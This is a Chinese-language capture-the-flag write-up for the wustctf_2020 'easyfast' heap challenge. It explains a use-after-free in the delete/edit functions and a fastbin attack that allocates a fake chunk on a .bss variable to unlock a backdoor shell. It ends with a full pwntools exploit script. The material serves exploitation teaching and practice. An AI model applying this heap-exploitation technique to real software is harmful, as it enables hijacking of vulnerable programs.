# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off
  - NX: on
  - RELRO: Partial RELRO
  - Canary: on

# 漏洞成因
## 程序关键结构体
程序使用一个全局数组 `buf` 来存储最多4个堆指针，数组起始地址为 `0x602080`。此外，还有一个全局变量 `qword_602090`（地址为 `0x602090`），该变量在 `backdoor` 函数中被检查，若为0则执行 `system("/bin/sh")`。

```c
void *buf[4]; // 0x602080
long qword_602090; // 0x602090
```

## 漏洞定位
`delete` 函数释放堆块后未将指针置空，导致 Use-After-Free（UAF）漏洞。`edit` 函数允许对已释放的堆块写入数据，进一步利用 UAF 可修改 fastbin 中的 fd 指针。

```c
unsigned __int64 sub_4009D7() // delete
{
  ...
  free(*(&buf + v1)); // 未置空指针
  ...
}

unsigned __int64 sub_400A4D() // edit
{
  ...
  read(0, *(&buf + v1), 8u); // 可对已释放堆块写入
  ...
}
```

# 漏洞利用过程：
利用 UAF 修改 fastbin 中 chunk 的 fd 指针，指向全局变量 `buf` 附近的地址，通过两次分配将 fake chunk 分配至 `0x602090`，进而修改 `qword_602090` 为0，最终触发 `backdoor` 获取 shell。

- Step 1~2: 布局堆并释放 chunk0，利用 UAF 修改其 fd 指针指向 `0x602080`（fake chunk 的 chunk 头地址）。
- Step 3: 两次分配使 fake chunk 被分配至 `0x602090`（即 `qword_602090` 的地址）。
- Step 4: 通过 edit 向 fake chunk 写入0，将 `qword_602090` 清零。
- Step 5: 调用 `backdoor` 获取 shell。

## Step 1~2
- 堆内存 chunk0（用户区域）在释放后，其 fd 指针位置原本指向 NULL（因为 fastbin 中仅此一个 chunk），经过 `edit(0, p64(0x602080))` 后，fd 被修改为 `0x602080`。变化原因：UAF 允许向已释放的 chunk 写入数据，从而篡改 fastbin 链表。
- 全局变量 `buf[0]` 仍指向已释放的 chunk0，内容未变（仍为堆地址）。变化原因：`delete` 未置空指针。

## Step 3
- 第一次 `add(0x40)` 从 fastbin 中取出 chunk0，分配为索引2（`buf[2]` 指向 chunk0 的用户区域）。
- 第二次 `add(0x40)` 由于 fastbin 中的 fd 已被修改，会从 `0x602080`（fake chunk 头）处分配，返回的用户区域地址为 `0x602090`，分配为索引3（`buf[3]` 指向 `0x602090`）。变化原因：fastbin attack 成功将 fake chunk 分配至 .bss 段。

## Step 4
- 全局变量 `qword_602090`（地址 `0x602090`）此前内容未知（可能为0或其他值），经过 `edit(3, p64(0))` 后，被覆盖为0。变化原因：通过索引3向 fake chunk 写入8字节0，直接修改了 `qword_602090` 的值。

## Step 5
- 调用 `backdoor` 函数，检查 `qword_602090` 为0，执行 `system("/bin/sh")`，获取 shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_14_wustctf_2020_easyfast')
elf = ELF('./data/bin/heap23_14_wustctf_2020_easyfast')
libc = elf.libc

def add(size):
    p.recvuntil(b'choice>\n')
    p.sendline(b'1')
    p.recvuntil(b'size>\n')
    p.sendline(str(size))

def delete(index):
    p.recvuntil(b'choice>\n')
    p.sendline(b'2')
    p.recvuntil(b'index>\n')
    p.sendline(str(index))

def edit(index,content):
    p.recvuntil(b'choice>\n')
    p.sendline(b'3')
    p.recvuntil(b'index>\n')
    p.sendline(str(index))
    p.send(content)

def backdoor():
    p.recvuntil(b'choice>\n')
    p.sendline(b'4')

add(0x40)      # 分配 chunk0，索引0
add(0x20)      # 分配 chunk1，索引1
delete(0)      # 释放 chunk0，fastbin 中 chunk0 的 fd 为 NULL
edit(0, p64(0x602080))  # UAF 修改 chunk0 的 fd 为 fake chunk 头地址 0x602080
add(0x40)      # 取回 chunk0，分配为索引2，fastbin 中剩下 fd 指向的 fake chunk
add(0x40)      # 分配 fake chunk，用户区域地址为 0x602090，分配为索引3
edit(3, p64(0)) # 向 fake chunk 写入0，将 qword_602090 清零
backdoor()     # 触发 backdoor，获取 shell
p.interactive()
```